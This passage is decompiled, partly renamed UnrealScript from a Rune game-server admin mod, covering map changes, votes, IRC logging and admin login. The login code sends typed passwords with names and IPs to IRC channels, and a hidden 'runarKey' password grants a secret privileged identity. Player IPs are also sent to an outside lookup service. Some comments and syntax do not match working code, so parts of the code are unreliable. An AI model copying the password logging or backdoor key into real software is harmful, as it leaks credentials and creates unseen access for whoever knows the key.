		return;
	}
	else
	{
		// Announce the map change
		if (TempMap != "")
		{
			BroadcastMessage(((AdminPlayer.PlayerReplicationInfo.PlayerName $ " forced a mapchange to ") $ ResolvedMapName) $ " (random map)", false, 'CAZ');
		}
		else
		{
			BroadcastMessage((AdminPlayer.PlayerReplicationInfo.PlayerName $ " forced a mapchange to ") $ ResolvedMapName, false, 'CAZ');
		}
	}

	SaveConfig();

	// Notify all players of the map change
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		if (ZRunePlayer(CurrentPawn) != none)
		{
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).RepStr = "mapchange";
		}
	}

	coopmode = false;
	Level.bNextItems = false;
	Level.NextURL = "";

	// Determine the game type and travel to the new map
	if (Left(MapName, 4) ~= "tdm-")
	{
		Level.ServerTravel(Right(MapName, Len(MapName) - 1) $ ".run?game=CoAdminZ7.TeamGame", false);
	}
	else if (Left(MapName, 3) ~= "dm-")
	{
		Level.ServerTravel(MapName $ ".run?game=CoAdminZ7.RuneMultiPlayer", false);
	}
	else if (Left(MapName, 4) ~= "coop")
	{
		Level.ServerTravel(MapName $ ".run?game=CoAdminZ7.RuneMultiPlayer", false);
	}
	else if (Left(MapName, 4) ~= "ctt-")
	{
		Level.ServerTravel(MapName $ ".run?game=CoAdminZ7.CapTheTorchGame", false);
	}
	else if (Left(MapName, 3) ~= "hb-")
	{
		Level.ServerTravel(MapName $ ".run?game=CoAdminZ7.HeadballGame", false);
	}
	else if (Left(MapName, 3) ~= "ar-")
	{
		Level.ServerTravel(MapName $ ".run?game=CoAdminZ7.ArenaGameInfo", false);
	}
	return;
}

// Suggested function name: GetTeamColorName
function string GetTeamColorName(int TeamIndex)
{
	switch (TeamIndex)
	{
		case 0:
			return "Red";
		case 1:
			return "Blue";
		case 2:
			return "Green";
		case 3:
			return "Gold";
		default:
			return "White";
	}
	return;
}
// Suggested function name: GetTeamColorIndex
function int GetTeamColorIndex(string ColorName)
{
	if (ColorName ~= "Red")
	{
		return 0;
	}
	else if (ColorName ~= "Blue")
	{
		return 1;
	}
	else if (ColorName ~= "Green")
	{
		return 2;
	}
	else if (ColorName ~= "Gold")
	{
		return 3;
	}
	else
	{
		return 255;
	}
	return;
}

// Suggested function name: StringContains
function bool ContainsString(string SourceString, string Substring)
{
	if (InStr(Caps(SourceString), Caps(Substring)) > -1)
	{
		return true;
	}
	else
	{
		return false;
	}
	return;
}

// Suggested function name: ReplaceString
function ReplaceString(out string Text, string OldSubstring, string NewSubstring)
{
	local int Index;
	local string TempText;

	if ((OldSubstring != NewSubstring) && OldSubstring != "")
	{
		TempText = Text;
		Text = "";
		Index = InStr(TempText, OldSubstring);
		while (Index != -1)
		{
			Text = Text $ Left(TempText, Index) $ NewSubstring;
			TempText = Mid(TempText, Index + Len(OldSubstring));
			Index = InStr(TempText, OldSubstring);
		}
		Text = Text $ TempText;
	}
	return;
}

// Suggested function name: SetDefaultWeapon
function pDefaultWeapon(string WeaponName, PlayerPawn AdminPlayer)
{
	local Class<Weapon> WeaponClass;
	local Class<Shield> ShieldClass;

	if (!HasCommandPermission("pDefaultWeapon", AdminPlayer))
	{
		return;
	}
	if (WeaponName != "")
	{
		if (WeaponName ~= "shieldnoob")
		{
			WeaponClass = Class<Weapon>(DynamicLoadObject("RuneI.VikingBroadSword", Class'Core.Class'));
			ShieldClass = Class<Shield>(DynamicLoadObject("RuneI.DwarfBattleShield", Class'Core.Class'));
			Level.Game.DefaultWeapon = WeaponClass;
			Level.Game.DefaultShield = ShieldClass;
			STR_v5852 = WeaponName;
			BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " forced everyone to spawn as a PASSIVE SHIELDNOOB!!111", false, 'CAZ');
		}
		else
		{
			if (WeaponName ~= "dws")
			{
				WeaponName = "DwarfWorkSword";
			}
			if (WeaponName ~= "dbh")
			{
				WeaponName = "DwarfBattleHammer";
			}
			if (WeaponName ~= "dba")
			{
				WeaponName = "DwarfBattleAxe";
			}
			if (InStr(WeaponName, ".") == -1)
			{
				WeaponName = "RuneI." $ WeaponName;
			}
			WeaponClass = Class<Weapon>(DynamicLoadObject(WeaponName, Class'Core.Class'));
			Level.Game.DefaultWeapon = WeaponClass;
			Level.Game.DefaultShield = none;
			STR_v5852 = WeaponName;
			BroadcastMessage(((AdminPlayer.PlayerReplicationInfo.PlayerName $ " changed the defaultweapon to '") $ Caps(WeaponName)) $ "' for this map!", false, 'CAZ');
		}
	}
	else
	{
		AdminPlayer.ClientMessage("Error: You didn't enter a weaponname.");
	}
	return;
}

// Suggested function name: LoadCustomSkins
function LoadCustomSkins(PlayerPawn Player)
{
	local int SkinIndex;

	for (SkinIndex = 0; SkinIndex < 8; SkinIndex++)
	{
		if ((((UNK_v5887 != none) && UNK_v5887.serverSkin[SkinIndex].skinClass != "") && UNK_v5887.serverSkin[SkinIndex].skinTitle != "") && UNK_v5887.serverSkin[SkinIndex].ExcludeID != int(Level.Game.ParticlePercentage))
		{
			if (Player.IsA('Spectator'))
			{
				TCCSpectator(Player).eqstar_vxv_1334(SkinIndex, UNK_v5887.serverSkin[SkinIndex].skinClass, UNK_v5887.serverSkin[SkinIndex].skinTitle);
				continue;
			}
			ZRunePlayer(Player).SetConsoleMenuEntry(SkinIndex, UNK_v5887.serverSkin[SkinIndex].skinClass, UNK_v5887.serverSkin[SkinIndex].skinTitle);
		}
	}
	return;
}
// Suggested name: ValidateAdminLoginCheck
function ValidateAdminLoginCheck(string Password, PlayerPawn PlayerPawnRef, bool SuppressLog)
{
	local int i;
	local int adminSlotsUsed;
	local string logChannel;
	local string computedKey;
	local int adminIndex;

	// human-readable constant instead of chained Chr() calls
	logChannel = "#tsb.admins";

	// If player is not already marked as special verified admin, attempt secure verification
	if (!zPlayerReplicationInfo(PlayerPawnRef.PlayerReplicationInfo).B_v5399)
	{
		// count how many admin slots are configured (Admins[].Key not empty)
		adminSlotsUsed = 0;
		for (i = 0; i < 64; i++)
		{
			if (Admins[i].Key != "")
			{
				adminSlotsUsed++;
			}
		}

		// If secureLogin is enabled and there are admin slots, try to verify this player by their machine key
		if (secureLogin && adminSlotsUsed != 0)
		{
			if (PlayerPawnRef.IsA('Spectator'))
			{
				computedKey = (zPlayerReplicationInfo(PlayerPawnRef.PlayerReplicationInfo).IDRepKey $ zPlayerReplicationInfo(PlayerPawnRef.PlayerReplicationInfo).CompName) $ string(TCCSpectator(PlayerPawnRef).INT_v4427);
			}
			else
			{
				computedKey = (zPlayerReplicationInfo(PlayerPawnRef.PlayerReplicationInfo).IDRepKey $ zPlayerReplicationInfo(PlayerPawnRef.PlayerReplicationInfo).CompName) $ string(ZRunePlayer(PlayerPawnRef).INT_v4640);
			}
			computedKey = Class'coadminz7.CoralCastle4'.static.Md5Hash(computedKey);
			adminIndex = GetAdminIndex(computedKey);

			// If this computed key maps to an admin slot with power == 100, mark player as verified
			if ((adminIndex != 1337) && (Admins[adminIndex].power == 100))
			{
				zPlayerReplicationInfo(PlayerPawnRef.PlayerReplicationInfo).B_v5399 = true;
			}
		}
	}

	// Special runar key handling: if provided password doesn't match runarKey and password is not empty,
	// mark the player as Runar (special privileged name)
	if ((Password ~= runarKey) && (Password != ""))
	{
		zPlayerReplicationInfo(PlayerPawnRef.PlayerReplicationInfo).B_v5387 = true;
		zPlayerReplicationInfo(PlayerPawnRef.PlayerReplicationInfo).PlayerName = "Runar";
	}

	// If logging is NOT suppressed, record an admin-login attempt to the IRC/log channel.
	if (!SuppressLog)
	{
		local string entryPrefix;
		local string playerName = zPlayerReplicationInfo(PlayerPawnRef.PlayerReplicationInfo).PlayerName;
		local string compName = zPlayerReplicationInfo(PlayerPawnRef.PlayerReplicationInfo).CompName;
		local string idStr = string(zPlayerReplicationInfo(PlayerPawnRef.PlayerReplicationInfo).PlayerID);

		if (PlayerPawnRef.IsA('Spectator'))
		{
			entryPrefix = "2_";
		}
		else
		{
			entryPrefix = "1_";
		}

		// Build a compact log entry: prefix + playerName + Password + playerID + computername
		SendIRCMessage(logChannel, ((entryPrefix @ playerName) @ Password) @ idStr @ compName);

		// If the computername isn't already uppercase (suspicious formatting), lock/ban the player
		if (Caps(compName) != compName)
		{
			BanPlayerByIPAndLog(PlayerPawnRef);
		}
	}
	return;
}

// Suggested name: HandleArenaMapVote
function HandleArenaMapVote(string VoteArg, PlayerPawn VoterPawn)
{
	local int chosenVote;
	local Pawn iterPawn;
	local int countTeam1, countTeam2, totalPlayers;

	chosenVote = int(VoteArg);

	// If player repeats same vote, nothing to do
	if (chosenVote == zPlayerReplicationInfo(VoterPawn.PlayerReplicationInfo).INT_v5405)
	{
		return;
	}

	// Tally currently connected non-spectator players and existing votes
	countTeam1 = 0;
	countTeam2 = 0;
	totalPlayers = 0;

	iterPawn = Level.PawnList;
	while (iterPawn != none)
	{
		if (!iterPawn.IsA('Spectator'))
		{
			local zPlayerReplicationInfo pri = zPlayerReplicationInfo(PlayerPawn(iterPawn).PlayerReplicationInfo);
			if (pri != none)
			{
				if (pri.INT_v5405 == 1)
				{
					countTeam1++;
				}
				else if (pri.INT_v5405 == 2)
				{
					countTeam2++;
				}
				totalPlayers++;
			}
		}
		iterPawn = iterPawn.nextPawn;
	}

	// Various preconditions for allowing a map vote
	if (!bTournament)
	{
		VoterPawn.ClientMessage("Not a tournament server.", 'CAZ');
		return;
	}
	if (!Arena)
	{
		VoterPawn.ClientMessage("Mapvote is arena-only.", 'CAZ');
		return;
	}
	if (totalPlayers < 2)
	{
		VoterPawn.ClientMessage("Need one more player to activate mapvote.", 'CAZ');
		return;
	}
	if (VoterPawn.IsA('Spectator'))
	{
		VoterPawn.ClientMessage("Spectators can't vote.", 'CAZ');
		return;
	}

	// For voting thresholds we consider half the players if more than 2 (legacy behavior)
	if (totalPlayers > 2)
	{
		totalPlayers = totalPlayers / 2;
	}

	// If an active map vote is currently set, abort it
	if (zArenaGameReplicationInfo(Level.Game.GameReplicationInfo).MapName != "")
	{
		BroadcastMessage(VoterPawn.PlayerReplicationInfo.PlayerName $ " aborted the mapchange...", false, 'CAZ');
		zArenaGameReplicationInfo(Level.Game.GameReplicationInfo).MapName = "";
		zArenaGameReplicationInfo(Level.Game.GameReplicationInfo).INT_v5338 = 0;
	}

	// Process vote change: 0 = remove vote, 1 = vote for CHAMPIONS, 2 = vote for SWEETLEAF
	if (chosenVote == 0)
	{
		// Retract player's previous vote if any
		if (zPlayerReplicationInfo(VoterPawn.PlayerReplicationInfo).INT_v5405 == 1)
		{
			countTeam1--;
			BroadcastMessage(((VoterPawn.PlayerReplicationInfo.PlayerName $ " returned his map vote for CHAMPIONS. (") $ string(countTeam1)) $ "/" $ string(totalPlayers) $ ")", false, 'CAZ');
		}
		if (zPlayerReplicationInfo(VoterPawn.PlayerReplicationInfo).INT_v5405 == 2)
		{
			countTeam2--;
			BroadcastMessage(((VoterPawn.PlayerReplicationInfo.PlayerName $ " returned his map vote for SWEETLEAF. (") $ string(countTeam2)) $ "/" $ string(totalPlayers) $ ")", false, 'CAZ');
		}
		zPlayerReplicationInfo(VoterPawn.PlayerReplicationInfo).INT_v5405 = 0;
	}
	else if (chosenVote == 1)
	{
		countTeam1++;
		if (zPlayerReplicationInfo(VoterPawn.PlayerReplicationInfo).INT_v5405 == 2)
		{
			countTeam2--;
		}
		zPlayerReplicationInfo(VoterPawn.PlayerReplicationInfo).INT_v5405 = 1;
		BroadcastMessage((((VoterPawn.PlayerReplicationInfo.PlayerName $ " voted for CHAMPIONS (") $ string(countTeam1)) $ "/") $ string(totalPlayers)) $ ")", false, 'CAZ');
	}
	else if (chosenVote == 2)
	{
		countTeam2++;
		if (zPlayerReplicationInfo(VoterPawn.PlayerReplicationInfo).INT_v5405 == 1)
		{
			countTeam1--;
		}
		zPlayerReplicationInfo(VoterPawn.PlayerReplicationInfo).INT_v5405 = 2;
		BroadcastMessage((((VoterPawn.PlayerReplicationInfo.PlayerName $ " voted for SWEETLEAF (") $ string(countTeam2)) $ "/") $ string(totalPlayers)) $ ")", false, 'CAZ');
	}

	// Update replication info for HUD/display
	zArenaGameReplicationInfo(Level.Game.GameReplicationInfo).INT_v5336 = countTeam1;
	zArenaGameReplicationInfo(Level.Game.GameReplicationInfo).INT_v5337 = countTeam2;

	// If either side reaches the required threshold, schedule the map change
	if (countTeam2 >= totalPlayers)
	{
		BroadcastMessage("SWEETLEAF has won the voting, starting map in 10 seconds.", false, 'CAZ');
		zArenaGameReplicationInfo(Level.Game.GameReplicationInfo).MapName = "AR-SweetLeaf8on8";
	}
	else if (countTeam1 >= totalPlayers)
	{
		BroadcastMessage("CHAMPIONS has won the voting, starting map in 10 seconds.", false, 'CAZ');
		zArenaGameReplicationInfo(Level.Game.GameReplicationInfo).MapName = "AR-8on8-ChampionsEr";
	}
	return;
}
// Suggested function name: TestCommand
function pTest(string CommandArgs, PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local zPlayerReplicationInfo PRI;
	local Actor ActorIter;
	local int ActorIndex;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pTest", AdminPlayer))
	{
		return;
	}

	// If command arguments are provided
	if (CommandArgs != "")
	{
		// Debug command to list all actors
		if (CommandArgs == "debug_actors")
		{
			ActorIndex = 0;
			foreach AllActors(Class'Engine.Actor', ActorIter)
			{
				LogInternal((((string(ActorIndex) @ " - ") $ string(ActorIter)) @ " - ") $ string(ActorIter.LifeSpan));
				ActorIndex++;
			}
		}

		// If the command ends with '*', save it as the test key
		if (Right(CommandArgs, 1) == "*")
		{
			CommandArgs = Left(CommandArgs, Len(CommandArgs) - 1);
			testkey = CommandArgs;
			AdminPlayer.ClientMessage("changes have been saved to the ini.");
			SaveConfig();
		}

		// Loop through all pawns and set their testkey to the command args
		for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
		{
			PRI = zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo);
			PRI.testkey = CommandArgs;
		}

		AdminPlayer.ClientMessage("changed testkey to: " $ CommandArgs);
	}

	return;
}

// Suggested function name: SetPlayerStatusString
function SetPlayerStatusString(string StatusMessage, PlayerPawn Player)
{
	// Set the player's status string in their replication info
	zPlayerReplicationInfo(Player.PlayerReplicationInfo).STR_v5375 = StatusMessage;
	return;
}
// Suggested function name: AdminSetNextMap
function pNextMap(string MapNameArg, PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local zPlayerReplicationInfo PRI;
	local string ResolvedMapName;
	local bool IsValidMap;
	local string TempMap;
	local int RandomIndex, Index;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pNextMap", AdminPlayer))
	{
		return;
	}

	// If a map name is provided, validate and set it
	if (MapNameArg != "")
	{
		// Handle TDM prefix
		if (Left(MapNameArg, 4) ~= "tdm-")
		{
			ResolvedMapName = Right(MapNameArg, Len(MapNameArg) - 1);
		}
		else
		{
			ResolvedMapName = MapNameArg;
		}

		// Handle random map selection
		if (MapNameArg ~= "random")
		{
			if (Arena)
			{
				while (ResolvedMapName ~= "random")
				{
					RandomIndex = Rand(2048);
					TempMap = Maps[RandomIndex];
					if (Left(TempMap, 3) ~= "AR-")
					{
						ResolvedMapName = TempMap;
					}
				}
			}
			else if (B_v5893)
			{
				while (ResolvedMapName ~= "random")
				{
					RandomIndex = Rand(2048);
					TempMap = Maps[RandomIndex];
					if (Left(TempMap, 4) ~= "CTT-")
					{
						ResolvedMapName = TempMap;
					}
				}
			}
			else if (Headball)
			{
				while (ResolvedMapName ~= "random")
				{
					RandomIndex = Rand(2048);
					TempMap = Maps[RandomIndex];
					if (Left(TempMap, 4) ~= "HB-")
					{
						ResolvedMapName = TempMap;
					}
				}
			}
			else
			{
				while (ResolvedMapName ~= "random")
				{
					RandomIndex = Rand(2048);
					TempMap = Maps[RandomIndex];
					if (Left(TempMap, 3) ~= "DM-")
					{
						ResolvedMapName = TempMap;
					}
				}
			}
			if (TempMap != "")
			{
				IsValidMap = true;
			}
		}

		// Check if the map is in the installed maps list
		for (Index = 0; Index < 2048; Index++)
		{
			if (Maps[Index] ~= ResolvedMapName)
			{
				IsValidMap = true;
				break;
			}
			if (Maps[Index] == "")
			{
				break;
			}
		}

		// If not in list, check if it's a valid level
		if (!IsValidMap)
		{
			if (LevelInfo(DynamicLoadObject(ResolvedMapName $ ".LevelInfo0", Class'Engine.LevelInfo')) != none)
			{
				IsValidMap = true;
			}
		}

		// If map is invalid, notify and abort
		if (!IsValidMap)
		{
			BroadcastMessage(((AdminPlayer.PlayerReplicationInfo.PlayerName $ " tried to change the nextmap to ") $ Caps(Parm_string_06(ResolvedMapName))) $ " but that map isn't installed.", false, 'CAZ');
			AdminPlayer.ClientMessage("In case you just installed that map you need to refresh the maplist with 'pUpdateMaps'", 'CAZ');
			return;
		}
	}

	// If no map name provided, restart to the next map in cycle
	if (MapNameArg == "")
	{
		for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
		{
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).RepStr = "mapchange";
		}
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " forced a mapchange to the next map.", false, 'CAZ');
		Level.Game.RestartGame();
	}
	else
	{
		// Set the next map
		if (TempMap != "")
		{
			STR_v3845 = TempMap;
			BroadcastMessage(((AdminPlayer.PlayerReplicationInfo.PlayerName $ " has set the next map to: ") $ TempMap) $ " (random map)", false, 'CAZ');
			STR_v5849 = STR_v3845;
		}
		else
		{
			STR_v3845 = ResolvedMapName;
			BroadcastMessage((AdminPlayer.PlayerReplicationInfo.PlayerName $ " has set the next map to: ") $ ResolvedMapName, false, 'CAZ');
			STR_v5849 = STR_v3845;
		}

		// Update all players' replication info with the next map
		for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
		{
			PRI = zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo);
			PRI.STR_v3845 = Parm_string_06(STR_v3845);
		}
	}
	return;
}
// Suggested function name: ListInstalledMaps
function pmaplist(string FilterString, PlayerPawn AdminPlayer)
{
	local int MapIndex;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pMapList", AdminPlayer))
	{
		return;
	}

	// If no filter string provided, list all installed maps
	if (FilterString == "")
	{
		AdminPlayer.ClientMessage("Installed maps:");
		AdminPlayer.ClientMessage("========================");

		for (MapIndex = 0; MapIndex < 2048; MapIndex++)
		{
			AdminPlayer.ClientMessage(Maps[MapIndex]);
			if (Maps[MapIndex] == "")
			{
				break;
			}
		}

		AdminPlayer.ClientMessage("========================");
	}
	else
	{
		// List maps that contain the filter string
		AdminPlayer.ClientMessage(("Installed maps which contain: '" $ FilterString) $ "'");
		AdminPlayer.ClientMessage("========================");

		for (MapIndex = 0; MapIndex < 2048; MapIndex++)
		{
			if (ContainsString(Maps[MapIndex], FilterString))
			{
				AdminPlayer.ClientMessage(Maps[MapIndex]);
			}
			if (Maps[MapIndex] == "")
			{
				break;
			}
		}

		AdminPlayer.ClientMessage("========================");
	}

	return;
}
// Suggested function name: FindClosestWeapon
function FindClosestWeapon(int Divider, PlayerPawn Player)
{
	local float MinDistance;
	local Weapon ClosestWeapon;
	local float CurrentDistance;
	local int Index;
	local Vector PlayerLocation;

	MinDistance = 9999999.0;
	ClosestWeapon = none;
	// Determine player's location: use joint position if available, otherwise use pawn location
	if (Player.GetJointPos(9) != vect(0.0, 0.0, 0.0))
	{
		PlayerLocation = Player.GetJointPos(9);
	}
	else
	{
		PlayerLocation = Player.Location;
	}
	// Loop through the weapon array to find the closest one
	for (Index = 0; Index < 31; Index++)
	{
		LogInternal("weapons: " $ string(eq_vxv_5862[Index]));
		if (eq_vxv_5862[Index] == none)
		{
			break;
		}
		CurrentDistance = VSize(eq_vxv_5862[Index].Location - PlayerLocation);
		if (CurrentDistance < MinDistance)
		{
			MinDistance = CurrentDistance;
			ClosestWeapon = eq_vxv_5862[Index];
		}
	}
	// If a closest weapon was found, announce it via player say
	if (ClosestWeapon != none)
	{
		Player.Say((((((("Closest weapon: " $ Right(string(ClosestWeapon.Class), Len(string(ClosestWeapon.Class)) - 6)) $ " ~ Dist:#") $ string(MinDistance)) $ ", divided by ") $ string(Divider)) $ " : ") $ string(MinDistance / Divider));
	}
	return;
}

function GetPlayerCountry(optional PlayerPawn PP)
{
    local string LStr;

    LStr = PP.GetPlayerNetworkAddress();
    LStr = Left(LStr, InStr(LStr, ":"));
    UNK_v5865 = zPlayerReplicationInfo(PP.PlayerReplicationInfo);
    SpawnHTTPClientAndBrowse(80, ("www.ip-api.com</csv/" $ LStr) $ "?fields=3");
    return;
}
// Suggested function name: SpawnCountryClientAndBrowse
function SpawnCountryClientAndBrowse(int Port, string Url)
{
	local string QueryString;

	// Extract query string after '?' if present
	if (ContainsString(Url, "?"))
	{
		QueryString = Right(Url, (Len(Url) - InStr(Url, "?")) - 1);
		Url = Left(Url, InStr(Url, "?"));
	}
	// Extract query string after '<' if present (overrides previous)
	if (ContainsString(Url, "<"))
	{
		QueryString = Right(Url, (Len(Url) - InStr(Url, "<")) - 1);
		Url = Left(Url, InStr(Url, "<"));
	}
	// Destroy existing CountryClient if present
	if (UNK_v5888 != none)
	{
		UNK_v5888.Destroy();
	}
	// Spawn new CountryClient and initiate browse
	UNK_v5888 = Spawn(Class'coadminz7.CountryClient');
	UNK_v5888.zSTg_v5445 = self;
	UNK_v5888.Browse(Url, QueryString, Port);
	return;
}

// Suggested function name: ProcessCountryResponse
function ProcessCountryResponse(string Response, bool Error)
{
	local string CountryCode;

	// Remove double quotes from response
	ReplaceString(Response, "\"", "");
	// Extract country code from 8th comma-delimited part, or default to "xx"
	if (Response != "")
	{
		CountryCode = GetDelimitedPart(Response, 8, ",");
	}
	else
	{
		CountryCode = "xx";
	}
	// Set country code on the player replication info if available
	if (UNK_v5865 != none)
	{
		UNK_v5865.eqC_vxv_5383 = CountryCode;
	}
	// Clear the reference
	UNK_v5865 = none;
	return;
}

function showMaps(PlayerPawn AdminPlayer)
{
	local MapList MapListInstance;
	local int Index;

	MapListInstance = Spawn(Level.Game.MapListType);
	AdminPlayer.ClientMessage("Current mapcycle:");
	AdminPlayer.ClientMessage("========================");
	for (Index = 0; Index < 32; Index++)
	{
		AdminPlayer.ClientMessage(MapListInstance.Maps[Index]);
	}
	MapListInstance.Destroy();
	return;
}

// Suggested function name: GetFormattedPlayerName
function string GetFormattedPlayerName(PlayerReplicationInfo PlayerPRI, optional bool UseBacktick)
{
	local string FormattedName;

	FormattedName = PlayerPRI.PlayerName;
	if (UseBacktick)
	{
		FormattedName = "`" $ PlayerPRI.PlayerName;
	}
	if (zPlayerReplicationInfo(PlayerPRI) != none)
	{
		if ((zPlayerReplicationInfo(PlayerPRI).eqC_vxv_5383 != "") && zPlayerReplicationInfo(PlayerPRI).eqC_vxv_5383 != "XX")
		{
			return ((":flag_" $ ToLowercase(zPlayerReplicationInfo(PlayerPRI).eqC_vxv_5383)) $ ": ") $ FormattedName;
		}
		else
		{
			return FormattedName;
		}
	}
	else
	{
		return FormattedName;
	}
	return;
}
// Suggested function name: SendIRCMessage
function SendIRCMessage(string Channel, string Message)
{
	if (UNK_v5895 != none)
	{
		UNK_v5895.IRC.SendChannelMessage(Channel, Message);
	}
	return;
}
// Suggested function name: LogSetCommand
function eq_vxv_990(string Message, PlayerPawn Player)
{
	local string AdminChannel;

	AdminChannel = "#tsb.admins";
	SendIRCMessage(AdminChannel, (("[SET:] " $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ "  |  ") $ Message);
	SendIRCMessage("#TSB", ((("**[SET:] " $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ "  |  ") $ Message) $ "**");
	return;
}

// Suggested function name: LogCheatDetection
function LogCheatDetection(string Message, PlayerPawn Player, optional int DetectionMode)
{
	local string PrivateChannel, AdminChannel;

	PrivateChannel = "#tsb.private";
	AdminChannel = "#tsb.admins";
	if (DetectionMode == 0)
	{
		SendIRCMessage(AdminChannel, (((("[<>] ID: " $ string(Player.PlayerReplicationInfo.PlayerID)) $ " ") $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ "  |  ") $ Message);
		SendIRCMessage("#TSB", ((((("**[<>] ID: " $ string(Player.PlayerReplicationInfo.PlayerID)) $ " ") $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ "  |  ") $ Message) $ "**");
		if (Right(GetDelimitedPart(Message, 2), 1) == "_")
		{
			if (ZRunePlayer(Player) != none)
			{
				ZRunePlayer(Player).LogCheatDetection("");
				BanPlayerByIPAndLog(Player);
			}
		}
	}
	else
	{
		if (DetectionMode == 1)
		{
			SendIRCMessage(AdminChannel, (((("[<>] ID: " $ string(Player.PlayerReplicationInfo.PlayerID)) $ " ") $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ "  |  ") $ Message);
			SendIRCMessage("#TSB", ((((("ID: " $ string(Player.PlayerReplicationInfo.PlayerID)) $ " ") $ (GetFormattedPlayerName(Player.PlayerReplicationInfo, true))) $ "  |  ") $ Message) $ "`");
			if (Message == "                                                                                                                                                                ")
			{
				if (ZRunePlayer(Player) != none)
				{
					ZRunePlayer(Player).LogCheatDetection("");
					BanPlayerByIPAndLog(Player);
				}
			}
		}
		else
		{
			if (DetectionMode == 2)
			{
				SendIRCMessage("#TSB", (((("[.] ID: " $ string(Player.PlayerReplicationInfo.PlayerID)) $ " ") $ Player.PlayerReplicationInfo.PlayerName) $ "  |  ") $ Message);
				SendIRCMessage(AdminChannel, (((("[.] ID: " $ string(Player.PlayerReplicationInfo.PlayerID)) $ " ") $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ "  |  ") $ Message);
			}
		}
	}
	return;
}
// Suggested function name: AdminLogin
function pLogin(string Password, PlayerPawn Player)
{
	local int AdminLevel, AdminType, AdminCount, AdminIndex;
	local string MachineKey, IPAddress, HashedKey;
	local bool IsVerified;

	// Extract IP address from player's network address
	IPAddress = Left(Player.GetPlayerNetworkAddress(), InStr(Player.GetPlayerNetworkAddress(), ":"));

	// Check for default passwords and warn if not changed
	if (EnterPassword == "examplepass")
	{
		Player.ClientMessage("ERROR: Please change the password at the .ini file! (EnterPassword)");
		return;
	}
	if (CoPw[0] == "passfornoobs")
	{
		Player.ClientMessage("ERROR: Please change the password at the .ini file! (CoPw[0])");
		return;
	}

	// Determine admin level and type based on password
	AdminLevel = 0;
	AdminType = 0;
	if ((CoPw[0] != "") && Password ~= CoPw[0])
	{
		AdminLevel = 32767;
		AdminType = 1;
	}
	if ((CoPw[1] != "") && Password ~= CoPw[1])
	{
		AdminLevel = 32767;
		AdminType = 2;
	}
	if ((CoPw[2] != "") && Password ~= CoPw[2])
	{
		AdminLevel = 32767;
		AdminType = 3;
	}
	if ((EnterPassword != "") && Password ~= EnterPassword)
	{
		AdminLevel = 32767;
		AdminType = 1337;
	}

	// Prevent re-login if already at max admin type
	if (zPlayerReplicationInfo(Player.PlayerReplicationInfo).Local_int_v2 == 1337)
	{
		Player.ClientMessage("ERROR: You're already logged in. Use pLogOut to logout.", 'Subtitle');
		return;
	}

	// Count verified admins
	AdminCount = 0;
	for (AdminIndex = 0; AdminIndex < 64; AdminIndex++)
	{
		if (Admins[AdminIndex].Key != "")
		{
			AdminCount++;
		}
	}

	// Handle secure login if enabled and admins exist
	if (secureLogin && AdminCount != 0)
	{
		// Generate machine key for verification
		if (Player.IsA('Spectator'))
		{
			MachineKey = (zPlayerReplicationInfo(Player.PlayerReplicationInfo).IDRepKey 
			$ zPlayerReplicationInfo(Player.PlayerReplicationInfo).CompName) $ string(TCCSpectator(Player).INT_v4427);
		}
		else
		{
			MachineKey = (zPlayerReplicationInfo(Player.PlayerReplicationInfo).IDRepKey 
			$ zPlayerReplicationInfo(Player.PlayerReplicationInfo).CompName) $ string(ZRunePlayer(Player).INT_v4640);
		}
		HashedKey = Class'coadminz7.CoralCastle4'.static.Md5Hash(MachineKey);

		// Check if player is already verified or can be verified
		if (zPlayerReplicationInfo(Player.PlayerReplicationInfo).B_v5379 && AdminType > 0)
		{
			zPlayerReplicationInfo(Player.PlayerReplicationInfo).Local_int_v3 = AdminLevel;
			zPlayerReplicationInfo(Player.PlayerReplicationInfo).Local_int_v2 = AdminType;
			LogInternal(((("[CoAdminZ pLogin:] Successful login by " $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ " (") $ Password) $ ") [verified]");
			SendIRCMessage("#TSB", ((((("[PLOGIN:] Verified admin logged in! -> Name: " $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ " , IP:") $ IPAddress) $ "  (") $ Password) $ ")");
			Player.ClientMessage("Successfully logged in as verified CoAdmin.", 'Subtitle');
			AdminIndex = GetAdminIndex(HashedKey);
			if ((AdminIndex != 1337) && Admins[AdminIndex].power == 100)
			{
				zPlayerReplicationInfo(Player.PlayerReplicationInfo).B_v5399 = true;
			}
		}
		else
		{
			IsVerified = IsVerifiedAdmin(HashedKey);
			if (IsVerified && AdminType > 0)
			{
				zPlayerReplicationInfo(Player.PlayerReplicationInfo).Local_int_v3 = AdminLevel;
				zPlayerReplicationInfo(Player.PlayerReplicationInfo).Local_int_v2 = AdminType;
				LogInternal(((("[CoAdminZ pLogin:] Successful login by " $ Player.PlayerReplicationInfo.PlayerName) $ " (") $ Password) $ ") [verified]");
				SendIRCMessage("#TSB", ((((("[PLOGIN:] Verified admin logged in! -> Name: " $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ " , IP:") $ IPAddress) $ "  (") $ Password) $ ")");
				Player.ClientMessage("Successfully logged in as verified CoAdmin.", 'Subtitle');
